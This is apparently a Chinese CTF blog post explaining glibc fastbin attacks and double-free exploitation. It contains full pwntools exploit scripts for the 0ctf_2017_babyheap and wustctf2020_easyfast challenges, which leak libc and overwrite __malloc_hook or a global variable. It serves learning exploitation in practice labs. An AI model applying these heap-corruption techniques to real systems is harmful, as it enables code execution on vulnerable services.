---
layout: post
title: fastbin_attack小记
category: Heap
date: 2023-9-23 21:04:32
hide: true
---
fastbin_attack
<!-- more -->
[toc]
# fastbin attack

首先要知道`fastbin`的`chunk`的大小范围。

> 32位下，fastbin chunk的范围是16字节 - 64字节（0x10 - 0x40）
>
> 64位下，fastbin chunk的范围是32字节-128字节（0x20 - 0x80）
>
> 注意，这是加上header的大小。

`fastbin`方法流程比较简单，即通过某种手段能够控制`fastbin`中的`chunk`的`fd`指针时，将其指向一个想要往其写入数据的地方，这样再次`malloc`这个大小的`chunk`的时候就可以将这个地方分配为`chunk`，达到任意地址写的效果。但是条件如下：

- fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- **fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。**
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

要注意，被指向的地方的`chunk header`中的`size`必须满足`fastbin`的要求，即大小和`fastbin`中指向该`fake chunk`的`chunk`大小相同。若无法直接找到，可以利用地址偏移一些来寻找，也可以借助工具，比如`pwndbg`中可以使用`find_fast_chunk addr`来寻找一个可以覆盖掉`addr`地址的`chunk`。

例题是0ctf_2017_nanyheap：

整体思路是使用`unsort bin`泄露`main_arena`（`unsort bin`在只有一个`chunk`的时候`fd`和`bk`都指向`main_arena`的某个固定偏移处），再通过`main_arena`计算偏移得到`libc`和其他函数地址。

之后使用`fastbin attack`来向`__malloc_hook`中写入`one_gadget`算出来的`gadget`即可。注意，本来`malloc_hook`前是没有明显的可以分配的`fastbin`大小的`chunk`的，但是可以通过小部分偏移来得到刚好可以覆盖掉`__malloc_hook`的`chunk`，此处在`pwngdb`使用命令`find_fast_chunk &__malloc_hook`即可。

```python
# value
# size
# pointer -> malloc(size)
from pwn import *
from LibcSearcher import *

filename = './0ctf_2017_babyheap'
context(log_level='debug')
local = 1
elf = ELF(filename)
# libc = ELF('./libc.so.6')
# libc = ELF('/home/ltfall/Desktop/pwn/buuctf_libc/ubuntu16_64/libc-2.23.so')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 25212)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def allocate(size):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter(': ', str(size))

def fill(index, size, content):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter(': ', str(index))
    sh.sendlineafter(': ', str(size))
    sh.sendafter(': ', content)

def free(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter(': ', str(index))

def dump(index):
    sh.sendlineafter(': ', '4')
    sh.sendlineafter(': ', str(index))

# 首先申请三个0x80的chunk，大概思路是先free第1个chunk，然后通过第0个chunk溢出修改第1个chunk的head，让OS误认为chunk1的大小是chunk1+chunk2
# 此时申请回chunk1，但是chunk1此时就是chunk1+chunk2两个块重合了，然后因为题目里面是calloc，因此将变成0的恢复，然后free掉chunk2，chunk2将会被添加到unsortbin
# 因此chunk2的fd和bk都会指向main_arena，此时打印chunk1，打印的实际上是chunk1+chunk2两个块，因此可以打印出chunk2的fd和bk，并由此得出&main_arena、libc_addr。
allocate(0x80)
allocate(0x80)
allocate(0x80)
allocate(0x20) # 没有这个 做不出来 挺怪的
free(1)
fill(0, 0x90, b'a'*0x80 + p64(0) + p64(0x121))
allocate(0x110)
payload = b'a'*0x80 + p64(0) + p64(0x91) + b'c'*0x80 
fill(1, len(payload), payload)
free(2)
dump(1)
main_arena = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x58
info('the addr of main_arena is {}'.format(hex(main_arena)))
libc_addr = main_arena - 0x3c4b20
info('the libc addr is {}'.format(hex(libc_addr)))
fake_chunk_addr = libc_addr + 0x3c4aed
info('the fake_chunk_addr is {}'.format(hex(fake_chunk_addr)))
malloc_hook = libc_addr + 0x3c4b10
info('the addr of malloc_hook is {}'.format(hex(malloc_hook)))

# 接下来是fastbin attack
allocate(0x80) # 还原
# 此时到这里 前面几个chunk不管了 接下来是以chunk4开始的fast bin大小的chunk
allocate(0x60) # chunk4
allocate(0x60) # chunk5
free(5)
payload = b'd'*0x60 + p64(0x70) + p64(0x71) + p64(fake_chunk_addr)
fill(4, len(payload), payload)
allocate(0x60) # 还是chunk5
allocate(0x60) # chunk6

one_gadget = 0x4526a
payload = b'a'*(0x23 - 0x10) + p64(libc_addr + one_gadget)
fill(6, len(payload), payload)

allocate(0x10)
sh.interactive()
```

## Double Free

顾名思义，也就是将一个已经在`fastbins`里面的`chunk`再次添加到`fastbins`里面去，添加完成后就会有两个同样的`chunk`在一个`bins`里面。

比如：

```c
void* chunk1 = malloc(0x10);
void* chunk2 = malloc(0x10);

free(chunk1);
free(chunk2);
free(chunk1);
```

这样一来，在`fastbins`的大小为`0x20`的`bin`中，就会有：

![image-20230217172959638](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211712862.png)

因为`chunk1`指向`chunk2`，因此最右边的`chunk1`也会指向`chunk2`。

**值得注意的是，`fastbin`会对直接与`main arena`连接的`chunk`进行检查，因此必须借助第二个`chunk`才可以让两个一样的`chunk`都在同一个`bins`里面。**

有什么用呢？

若此时我们再申请一个`chunk`，那么左边的`chunk1`将会被申请到，若我们能够修改`chunk1`，便相当于修改了还在`fastbins`里面的右边的`chunk`的`fd`指针。如此以来，若当目前在`fastbins`里面的`chunk`都被`free`了，由于最右边的那个`chunk1`的`fd`指针是我们设计的值，那么接下来再进行`malloc`操作时，便会将我们设计的值作为地址，将我们指定的地址作为一个`chunk`返回给我们。相当于是实现了一个任意地址写的功能。

**但没有那么简单，我们设计的值作为地址的地方要作为`chunk`返回，必须要满足一个条件，即这个`chunk`的`size`值必须和`bins`单链表里面的其他`chunk`相同。**这样一来就没有问题了。

#### 例题wustctf2020_easyfast

exp

```python
# uaf漏洞，借助了0x602088处的有一个50的值，因为double free任意写的chunk的size必须和分配的相等，不然报错。

from pwn import *

context(log_level='debug')

elf = ELF('./wustctf2020_easyfast')
# sh = process('./wustctf2020_easyfast')
sh = remote('node4.buuoj.cn', 27643)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

def add(size):
    sh.recvuntil('choice>\n')
    sh.sendline('1')
    sh.recvuntil('size>\n')
    sh.sendline(str(size))

def delete(index):
    sh.sendlineafter('choice>\n', '2')
    sh.sendlineafter('index>\n', str(index))
    
def modify(index, content):
    sh.sendlineafter('choice>\n', '3')
    sh.sendlineafter('index>\n', str(index))
    sh.send(content)

add(0x40)
add(0x40)

delete(0)
delete(1)
delete(0)

modify(0, p64(0x602080))

# debug()
add(0x40)
add(0x40)

modify(3, p64(0))

sh.recvuntil('>\n')
sh.sendline('4')

sh.interactive()
```

# 